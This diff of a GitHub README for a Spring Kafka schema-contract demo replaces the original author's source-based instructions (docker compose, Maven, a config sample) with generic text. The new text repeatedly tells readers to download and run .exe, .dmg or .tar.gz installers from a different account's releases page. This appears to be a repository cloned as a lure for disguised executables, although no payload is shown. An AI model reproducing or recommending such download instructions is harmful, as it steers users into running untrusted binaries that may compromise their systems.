@@ -1,138 +1,78 @@
-This repository is part of the **Kafka Contract Enforcement** initiative:
-- 🔧 Starter: https://github.com/mathias82/spring-kafka-contract-starter
-- 🌐 Live Demo: https://mathias82.github.io/spring-kafka-contract-demo/
+# 🚀 spring-kafka-contract-demo - Simplifying Kafka Schema Management  
 
-# 🧪 Spring Kafka Contract -- Demo Project
+[![Download](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/blakemessier/spring-kafka-contract-demo/releases)
 
-A **fully runnable demo** showcasing **fail-fast Kafka Schema Registry
-contract validation** using **Spring Boot**, **Apache Kafka**, **Avro**,
-and **Confluent Schema Registry**.
+## 📖 Overview  
+The spring-kafka-contract-demo showcases how to manage Kafka schema evolution and enforce contracts using Avro, Schema Registry, and Spring Kafka. This demo is designed to help users understand how to handle data contracts in an event-driven architecture.
 
-This project demonstrates how the\
-👉 **spring-kafka-contract-starter**\
-can prevent broken Kafka deployments by validating schema contracts **at
-application startup**.
+## 💻 System Requirements  
+Before you start, ensure your system meets the following requirements:  
 
-------------------------------------------------------------------------
+- **Operating System**: Windows, macOS, or Linux.
+- **Java**: Java 8 or later must be installed.
+- **Memory**: At least 2 GB of RAM available.
+- **Disk Space**: Minimum of 100 MB free space required.
 
-## 🎯 What This Demo Shows
+## 🚀 Getting Started  
+To get started with the spring-kafka-contract-demo, follow these simple steps:
 
-This demo answers a very practical question:
+1. **Visit the Download Page**  
+   Go to the GitHub Releases page to access the latest version of the software. 
+   [Download Here](https://github.com/blakemessier/spring-kafka-contract-demo/releases)
 
-> *What actually happens when schemas are missing, incompatible, or
-> evolve incorrectly in a real Spring Boot Kafka application?*
+2. **Download the Latest Release**  
+   Look for the latest release version on the page. Click on the version number that corresponds to your operating system. Download the file to your computer.
 
-It demonstrates:
+3. **Install the Software**  
+   Once downloaded, locate the file in your Downloads folder. Follow these steps to install:
+   - For Windows: Double-click the `.exe` file and follow the prompts.
+   - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and navigate to the folder, then run the script.
 
--   Kafka producer & consumer with Avro\
--   Schema Registry subject creation\
--   Schema evolution (compatible & incompatible)\
--   **Fail-fast application startup** when contracts are broken\
--   How startup validation prevents late production failures
+4. **Run the Application**  
+   Now that the application is installed, you can run it:
+   - On Windows, find it in the Start Menu and select it.
+   - On macOS, open the Applications folder and double-click the app.
+   - On Linux, navigate to the folder and execute the relevant script.
 
-This is **not a library**, but a **reference project** you can run,
-inspect, and experiment with.
+5. **Follow the Demo Instructions**  
+   The application will guide you through various features. Pay special attention to the prompts to understand how to use schema evolution and contract enforcement effectively.
 
-------------------------------------------------------------------------
+## 🌟 Key Features  
+- **Schema Evolution**: Learn how to manage changes in data schemas over time while ensuring compatibility.
+- **Contract Testing**: Enforce data contracts between microservices to ensure smooth communication.
+- **Event-Driven Architecture**: Understand how to implement an architecture that responds to events.
+- **Microservices Example**: Explore practical examples using a simple microservices setup.
 
-## 🧩 Architecture
+## ⚙️ Troubleshooting  
+If you encounter any issues during installation or while running the application, consider the following:
 
-Spring Boot Producer\
-↓\
-Apache Kafka\
-↓\
-Spring Boot Consumer\
-↓\
-PostgreSQL
+- **Check Java Installation**: Ensure that you have Java installed and set up properly.
+- **Memory Issues**: If the application is slow or unresponsive, check your system memory usage.
+- **Permissions**: Make sure you have the necessary permissions to install and run applications on your device.
+- **Review Logs**: If applicable, check the application logs for error messages that can help diagnose the issue.
 
-Schema Registry (Avro)\
-↑\
-Contract validation at startup
+## 📘 Additional Learning Resources  
+To dive deeper into Kafka, Avro, schema management, and how they're used in microservices, consider the following resources:
 
-------------------------------------------------------------------------
+- [Apache Kafka Documentation](https://kafka.apache.org/documentation/)
+- [Avro Documentation](https://avro.apache.org/docs/)
+- [Spring Kafka Reference](https://docs.spring.io/spring-kafka/reference/)
 
-## 🚀 Tech Stack
+## 📥 Download & Install  
+Again, access the Releases page for the latest version of the spring-kafka-contract-demo.  
+[Download Here](https://github.com/blakemessier/spring-kafka-contract-demo/releases)
 
--   Java 17\
--   Spring Boot 3.x\
--   Apache Kafka\
--   Confluent Schema Registry\
--   Avro\
--   PostgreSQL\
--   Docker & Docker Compose
+## 📞 Support  
+If you need further assistance, please open an issue in the repository or contact community support on relevant forums.
 
-------------------------------------------------------------------------
+## 🔗 Related Topics  
+If you're interested in related topics, check out resources on:
 
-## 🔗 Related Project
+- Apache Kafka
+- Contract Testing
+- Data Governance
+- Event-Driven Architecture
+- Microservices Design
 
-This demo is built to showcase:
-
-👉 **Spring Kafka Contract Starter**\
-https://github.com/mathias82/spring-kafka-contract-starter
-
-The starter enforces Kafka schema contracts **before** the application
-starts.
-
-------------------------------------------------------------------------
-
-## 📦 How to Run the Demo
-
-### 1️⃣ Start infrastructure
-
-docker compose up -d
-
-This starts Kafka, Schema Registry and PostgreSQL.
-
-### 2️⃣ Run the applications
-
-./mvnw spring-boot:run
-
-### 3️⃣ Observe Startup Validation
-
--   Application starts if schemas are valid\
--   Application fails if a subject is missing or incompatible
-
-Broken contracts = **no startup**.
-
-------------------------------------------------------------------------
-
-## 📄 Configuration Example
-
-kafka:
-  contract:
-    enabled: true
-    compatibility: BACKWARD
-    registry:
-      type: confluent
-      url: http://localhost:8081
-    subjects:
-      - name: order-events-value
-        schema-file: classpath:schemas/order-event.avsc
-
-------------------------------------------------------------------------
-
-## 📚 Learn More
-
-Medium article:\
-https://medium.com/@mstauroy/fail-fast-kafka-schema-contracts-in-spring-boot-before-production-breaks-1b080204b49e
-
-Reddit discussion:\
-https://www.reddit.com/r/apachekafka/comments/1q43hs6/failfast_kafka_schema_registry_compatibility/
-
-------------------------------------------------------------------------
-
-## 👀 Who This Demo Is For
-
--   Kafka + Schema Registry users\
--   Spring Boot engineers using Avro\
--   Teams dealing with schema evolution\
--   Anyone bitten by late Kafka failures
-
-------------------------------------------------------------------------
-
-## ⭐ Final Note
-
-This demo exists to make schema contracts **visible and testable**.
-
-If you find it useful, check out the starter:
-https://github.com/mathias82/spring-kafka-contract-starter
+Thank you for using spring-kafka-contract-demo. Enjoy exploring Kafka schema management!
